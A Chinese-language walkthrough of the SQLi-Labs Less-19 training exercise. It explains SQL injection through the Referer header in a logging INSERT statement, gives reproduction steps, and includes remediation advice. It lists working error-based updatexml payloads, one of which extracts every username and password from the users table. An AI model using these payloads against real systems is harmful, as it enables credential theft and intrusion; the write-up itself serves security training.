# SQLi-Labs | Less-19 POST Referer头注入
## 一、漏洞简介
登录成功后后端记录Referer请求头到数据库，insert语句，Referer可控，HTTP头报错注入，和Less18类型一致，注入点换成Referer。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-19/
注入类型：POST、Referer头注入、单引号闭合、insert报错注入
## 三、复现步骤
1. 使用admin/admin正常登录，BP抓包。
2. 在请求头添加/修改Referer字段，填入注入payload。
3. 发送数据包，后端执行insert，页面报错带出数据。
## 四、Payload
Referer: `' and updatexml(1,concat(0x7e,database(),0x7e),1) --+`
Referer: `' and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1) --+`
## 五、漏洞原理
后端SQL：
`INSERT INTO referers (referer,ip_address) VALUES ('$referer','$ip')`
Referer请求头直接读取拼接，无过滤，写入数据库触发注入。
## 六、修复方案
1. 请求头参数做转义、过滤。
2. 日志插入使用预编译查询。
3. 关闭数据库错误详情输出。
## 七、总结
Less19和Less18思路完全相同，只是注入点从User-Agent变成Referer，都是登录后的日志写入注入。